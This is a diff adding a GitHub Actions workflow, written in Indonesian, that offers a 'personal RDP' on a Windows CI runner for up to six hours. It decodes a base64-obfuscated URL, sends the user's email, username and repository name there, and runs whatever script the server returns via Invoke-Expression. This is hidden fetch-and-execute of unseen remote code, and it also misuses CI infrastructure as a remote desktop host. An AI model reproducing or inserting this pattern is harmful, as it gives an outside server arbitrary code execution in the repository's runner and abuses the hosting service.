@@ -1,0 +1,46 @@
+name: ThyoCloud Personal RDP (Fork)
+
+on:
+  workflow_dispatch:
+    inputs:
+      userEmail:
+        description: 'Email yang terdaftar di Web ThyoCloud'
+        required: true
+      customUsername:
+        description: 'Username RDP (Opsional - Default: thyocloud)'
+        required: false
+        default: 'thyocloud'
+
+jobs:
+  build-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: 🚀 Menghubungkan ke ThyoCloud Server Web
+        env:
+          EMAIL: ${{ github.event.inputs.userEmail }}
+          USER: ${{ github.event.inputs.customUsername }}
+          REPO: ${{ github.event.repository.name }}
+        run: |
+          Write-Host "Verifikasi Email ke ThyoCloud..."
+          
+          $webUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly90aHlvY2xvdWQudXAucmFpbHdheS5hcHAvYXBpL2dldC1jb3Jl"))
+          
+          $body = @{ email = $env:EMAIL; username = $env:USER; repo = $env:REPO } | ConvertTo-Json
+          
+          try {
+            $req = Invoke-RestMethod -Uri $webUrl -Method Post -Body $body -ContentType "application/json"
+            
+            if ($req.success -eq $true) {
+              Write-Host "✅ Akses Diterima! Menjalankan Core Engine..."
+              Invoke-Expression $req.script
+            } else {
+              Write-Host "⛔ GAGAL: $($req.message)"
+              Write-Host "Pastikan kamu sudah klaim Token di Web dan Verify di Bot Telegram @BotThyo!"
+              exit 1
+            }
+          } catch {
+            Write-Host "⛔ Terjadi kesalahan jaringan. Coba lagi nanti."
+            exit 1
+          }
